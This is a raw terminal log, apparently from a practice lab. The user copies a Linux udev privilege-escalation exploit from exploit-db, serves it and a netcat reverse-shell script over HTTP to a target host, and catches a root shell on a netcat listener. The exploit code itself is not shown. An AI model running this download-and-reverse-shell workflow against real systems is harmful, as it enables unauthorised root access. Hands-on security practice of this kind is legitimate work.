Samba 2.2.8 (Linux Kernel 2.6 / Debian / Mandrake) - Share Privilege Escalation | linux/local/23674.txt
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/platforms/linux/local/8572.c
/usr/share/exploitdb/platforms/linux/local/8572.c: No such file or directory
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/platforms/linux/local/8572.c
/usr/share/exploitdb/platforms/linux/local/8572.c: No such file or directory
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ searchsploit privilege | grep -i linux | grep -i kernel | grep 2.6 | grep 8572.c
Linux Kernel 2.6 (Gentoo / Ubuntu 8.10/9.04) UDEV < 1.4.1 - Local Privilege Esca | linux/local/8572.c
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/
exploits/ files_exploits.csv files_shellcodes.csv shellcodes/  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/
aix/ bsd/ hp-ux/ linux_sparc/ nodejs/ python/ ultrix/
alpha/ bsd_x86/ immunix/ linux_x86/ novell/ qnx/ unix/
android/ cfm/ ios/ linux_x86-64/ openbsd/ ruby/ unixware/
arm/ cgi/ irix/ lua/ osx/ sco/ vxworks/
ashx/ freebsd/ java/ macos/ osx_ppc/ solaris/ watchos/
asp/ freebsd_x86/ json/ minix/ palm_os/ solaris_sparc/ windows/
aspx/ freebsd_x86-64/ jsp/ multiple/ perl/ solaris_x86/ windows_x86/
atheos/ go/ linux/ netbsd_x86/ php/ tru64/ windows_x86-64/
beos/ hardware/ linux_mips/ netware/ plan9/ typescript/ xml/
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/
dos/ local/ remote/ webapps/
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/
Display all 1050 possibilities? (y or n)
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/8
816.c 8303.c 8470.py 8534.c 8673.c 876.c 890.pl  
824.c 8369.sh 8478.sh 8572.c 8678.c 877.pl 895.c  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/85
8534.c 8572.c  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/85
8534.c 8572.c  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/85
8534.c 8572.c  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ less /usr/share/exploitdb/exploits/linux/local/8572.c
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ cp /usr/share/exploitdb/exploits/linux/local/8572.c ./privilege_escalation.c
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ ls
distccd.py privilege_escalation.c
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python3 -m http.server
Traceback (most recent call last):
File "<frozen runpy>", line 198, in \_run_module_as_main
File "<frozen runpy>", line 88, in \_run_code
File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
test(
File "/usr/lib/python3.12/http/server.py", line 1261, in test
with ServerClass(addr, HandlerClass) as httpd:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/socketserver.py", line 457, in **init**
self.server_bind()
File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
return super().server_bind()
^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
socketserver.TCPServer.server_bind(self)
File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python3 -m http.server -p 9999
Traceback (most recent call last):
File "<frozen runpy>", line 198, in \_run_module_as_main
File "<frozen runpy>", line 88, in \_run_code
File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
test(
File "/usr/lib/python3.12/http/server.py", line 1261, in test
with ServerClass(addr, HandlerClass) as httpd:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/socketserver.py", line 457, in **init**
self.server_bind()
File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
return super().server_bind()
^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
socketserver.TCPServer.server_bind(self)
File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python3 -m http.server -p 1019
Traceback (most recent call last):
File "<frozen runpy>", line 198, in \_run_module_as_main
File "<frozen runpy>", line 88, in \_run_code
File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
test(
File "/usr/lib/python3.12/http/server.py", line 1261, in test
with ServerClass(addr, HandlerClass) as httpd:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/socketserver.py", line 457, in **init**
self.server_bind()
File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
return super().server_bind()
^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
socketserver.TCPServer.server_bind(self)
File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server -p 1019
Traceback (most recent call last):
File "<frozen runpy>", line 198, in \_run_module_as_main
File "<frozen runpy>", line 88, in \_run_code
File "/usr/lib/python3.12/http/server.py", line 1314, in <module>
test(
File "/usr/lib/python3.12/http/server.py", line 1261, in test
with ServerClass(addr, HandlerClass) as httpd:
^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/socketserver.py", line 457, in **init**
self.server_bind()
File "/usr/lib/python3.12/http/server.py", line 1308, in server_bind
return super().server_bind()
^^^^^^^^^^^^^^^^^^^^^
File "/usr/lib/python3.12/http/server.py", line 136, in server_bind
socketserver.TCPServer.server_bind(self)
File "/usr/lib/python3.12/socketserver.py", line 473, in server_bind
self.socket.bind(self.server_address)
OSError: [Errno 98] Address already in use
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 1019
Serving HTTP on 0.0.0.0 port 1019 (http://0.0.0.0:1019/) ...
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
127.0.0.1 - - [21/Oct/2024 09:46:43] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [21/Oct/2024 09:46:43] code 404, message File not found
127.0.0.1 - - [21/Oct/2024 09:46:43] "GET /favicon.ico HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.1 - - [21/Oct/2024 10:34:49] "GET / HTTP/1.1" 200 -
192.168.56.1 - - [21/Oct/2024 10:34:49] code 404, message File not found
192.168.56.1 - - [21/Oct/2024 10:34:49] "GET /favicon.ico HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.56.101 - - [21/Oct/2024 11:11:48] "GET /privilege_escalation.c HTTP/1.0" 200 -
192.168.56.101 - - [21/Oct/2024 11:12:52] "GET /privilege_escalation.c HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ ls
distccd.py privilege_escalation.c
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ sudo ufw status
[sudo] password for dominik:
Status: active

To Action From

---

22 ALLOW Anywhere  
4444 ALLOW Anywhere  
3632 ALLOW Anywhere  
9999 ALLOW Anywhere  
22 (v6) ALLOW Anywhere (v6)  
4444 (v6) ALLOW Anywhere (v6)  
3632 (v6) ALLOW Anywhere (v6)  
9999 (v6) ALLOW Anywhere (v6)

dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ sudo ufw allow 8888
Rule added
Rule added (v6)
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ sudo ufw allow 12345
Rule added
Rule added (v6)
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ cat /proc/net/netlink
sk Eth Pid Groups Rmem Wmem Dump Locks Drops Inode
00000000f5f1e2d9 0 8481 00000113 0 0 0 2 0 73184  
00000000057eaf68 0 0 00000000 0 0 0 2 0 13  
000000002073828a 0 3270 00000440 0 0 0 2 0 21150  
00000000127eb340 0 1355 00000000 896 0 0 2 0 15539  
00000000e648893d 0 981 000405d1 0 0 0 2 0 11369  
00000000feeaa63c 0 825 00000001 0 0 0 2 0 979  
000000000c6a72c3 0 3715 00000555 0 0 0 2 0 23708  
00000000bfe72932 0 5542 00000113 0 0 0 2 0 58545  
00000000247a40e5 4 0 00000000 0 0 0 2 0 5121  
00000000a0e4bcf5 6 0 00000000 0 0 0 2 0 15529  
00000000c3ec19d4 6 1355 00000000 0 0 0 2 0 15540  
00000000b3ae42d6 7 0 00000000 0 0 0 2 0 177  
00000000cbd66cf9 9 1 00000000 0 0 0 2 0 7709  
00000000bb97fa53 9 0 00000000 0 0 0 2 0 19  
00000000c6d5d73f 10 0 00000000 0 0 0 2 0 146  
0000000017a42a2e 11 0 00000000 0 0 0 2 0 32  
00000000b3839cf8 12 1 00000000 0 0 0 2 0 7654  
000000009b746920 12 1355 00000000 0 0 0 2 0 15541  
000000001b7abe8e 12 0 00000000 0 0 0 2 0 9254  
000000000ab88462 15 2711 00000002 0 0 0 2 0 16200  
00000000630a64ae 15 2162947561 00000002 0 0 0 2 0 872  
000000003f92fd47 15 3894196099 00000002 0 0 0 2 0 11398  
0000000071c5a752 15 3300 00000002 0 0 0 2 0 81859  
0000000083db7ab8 15 4215418627 00000002 0 0 0 2 0 16795  
0000000025e56dbb 15 8311 00000002 0 0 0 2 0 74462  
000000009cb28ab1 15 0 00000000 0 0 0 2 0 24  
00000000aa355e74 15 1224 00000002 0 0 0 2 0 10317  
00000000ec32452a 15 981 00000002 0 0 0 2 0 11366  
0000000059f12e27 15 4232292940 00000002 0 0 0 2 0 10318  
00000000b2ca6452 15 2972 00000002 0 0 0 2 0 16347  
0000000046811655 15 2956 00000002 0 0 0 2 0 16810  
000000001b07fb75 15 8481 00000002 0 0 0 2 0 72024  
000000006870648d 15 2863 00000002 0 0 0 2 0 12968  
00000000bd9477b4 15 2910 00000002 0 0 0 2 0 13134  
00000000d2fd20e2 15 5542 00000002 0 0 0 2 0 57571  
00000000c803c063 15 3865 00000002 0 0 0 2 0 25273  
000000002f070d66 15 845 00000002 0 0 0 2 0 6803  
00000000e1466956 15 1 00000002 0 0 0 2 0 7641  
0000000083066898 15 4082867679 00000002 0 0 0 2 0 74826  
0000000097fbfbd1 15 750 00000002 0 0 0 2 0 871  
0000000082682579 15 3462731744 00000001 0 0 0 2 0 6440  
000000003be9419e 15 2900761028 00000002 0 0 0 2 0 9549  
00000000357ea6ed 15 3919457743 00000002 0 0 0 2 0 873  
00000000b5b9fe35 15 2980 00000002 0 0 0 2 0 16358  
00000000d383ecc8 15 8895 00000002 0 0 0 2 0 78062  
00000000634ee047 15 844 00000002 0 0 0 2 0 8806  
0000000002ae980a 15 2626197091 00000002 0 0 0 2 0 10319  
000000003d3f1458 15 2632189188 00000002 0 0 0 2 0 14112  
0000000068c5976a 15 2688 00000002 0 0 0 2 0 15021  
00000000af4281c0 15 2438976643 00000002 0 0 0 2 0 12270  
0000000044296b0e 15 3772952428 00000002 0 0 0 2 0 874  
00000000bfc6a9e6 16 1254097721 00000000 0 0 0 2 0 7082  
0000000059b0850e 16 4114613049 00000000 0 0 0 2 0 983  
000000009efc17ae 16 3263169337 00780000 0 0 0 2 0 981  
0000000082e29ccd 16 2948596537 00000000 0 0 0 2 0 980  
00000000a5fdebff 16 3036264799 00008000 0 0 0 2 0 11368  
00000000f0dcc40c 16 981 00000000 0 0 0 2 0 11367  
00000000a410ec3b 16 1837105977 00000000 0 0 0 2 0 989  
00000000fa9cbcba 16 536871737 00000000 0 0 0 2 0 10298  
00000000728246c4 16 0 00000000 0 0 0 2 0 14  
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ ps aux | grep udev
root 503 0.0 0.0 30084 7536 ? Ss 07:54 0:00 /usr/lib/systemd/systemd-udevd
dominik 17354 0.0 0.0 6932 2160 pts/4 S+ 11:16 0:00 grep udev
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ npm run dev^C
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ nc -lvp 12345
listening on [any] 12345 ...
ls
^C
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ nc -lvp 12345
listening on [any] 12345 ...

^C
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ mkdir nc_revshell
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ nano nc_revshell/
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ rmdir nc_revshell/
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ touch nc_rev.sh
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ nano nc_rev.sh
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ python -m http.server 9999
Serving HTTP on 0.0.0.0 port 9999 (http://0.0.0.0:9999/) ...
192.168.56.101 - - [21/Oct/2024 11:28:51] "GET /nc_rev.sh HTTP/1.0" 200 -
^C
Keyboard interrupt received, exiting.
dominik@kali:~/Documents/repos/Metasploit-Framework/exlpoits$ nc -lvp 12345
listening on [any] 12345 ...
192.168.56.101: inverse host lookup failed: Unknown host
connect to [192.168.56.1] from (UNKNOWN) [192.168.56.101] 42184
ls
bin
boot
cdrom
dev
etc
home
initrd
initrd.img
lib
lost+found
media
mnt
nohup.out
opt
proc
root
sbin
srv
sys
tmp
usr
var
vmlinuz
whoami
root
